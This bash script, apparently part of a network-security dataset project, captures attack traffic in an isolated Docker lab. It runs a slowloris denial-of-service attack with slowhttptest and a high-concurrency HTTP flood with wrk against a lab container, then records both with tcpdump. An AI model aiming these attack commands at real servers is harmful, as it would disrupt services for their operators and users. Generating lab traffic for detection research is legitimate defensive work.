#!/usr/bin/env bash
# Generate slow-HTTP DoS and a high-concurrency HTTP flood from the attacker container against
# server-b, captured on the same r1-r2 link as the benign traffic. These are the attack shapes the
# curl flood could not provide: slowloris holds many connections open dribbling tiny packets (long
# flows), and the wrk flood opens many concurrent connections at once.
#
# Isolated lab only: internal networks, the lab's own container as the target, every run bounded by
# a fixed duration and connection count. Standard published tools: slowhttptest, wrk.
# Usage: lab/slow_attacks.sh <prefix>   ->  writes lab/captures/<prefix>_{slowloris,wrkflood}.pcap
set -euo pipefail
cd "$(dirname "$0")"
prefix="$1"
compose="docker compose"
victim=10.10.3.10
filter='(tcp or udp) and ((src net 10.10.1.0/24 and dst net 10.10.3.0/24) or (src net 10.10.3.0/24 and dst net 10.10.1.0/24))'

iface=$($compose exec -T capture sh -c "ip -o -4 addr show | awk '/10\.10\.2\.2/ {print \$2}'")

start_capture() {
  $compose exec -d -T capture tcpdump -i "$iface" -U -s 128 -w "/captures/$1.pcap" "$filter"
  sleep 1
}
stop_capture() {
  sleep 1
  $compose exec -T capture pkill -INT tcpdump || true
  sleep 1
  $compose exec -T capture chown "$(id -u):$(id -g)" "/captures/$1.pcap"
  ls -la "captures/$1.pcap"
}

echo "== Slowloris (slow-HTTP DoS): slowhttptest, 500 slow connections, 40s =="
start_capture "${prefix}_slowloris"
$compose exec -T attacker slowhttptest -c 500 -H -i 10 -r 100 -t GET -u "http://$victim:8080/" -x 24 -p 5 -l 40 >/dev/null 2>&1 || true
stop_capture "${prefix}_slowloris"

echo "== HTTP flood (high concurrency): wrk, 4 threads x 200 connections, 25s =="
start_capture "${prefix}_wrkflood"
$compose exec -T attacker wrk -t4 -c200 -d25s "http://$victim:8080/" >/dev/null 2>&1 || true
stop_capture "${prefix}_wrkflood"

echo "done: lab/captures/${prefix}_{slowloris,wrkflood}.pcap"
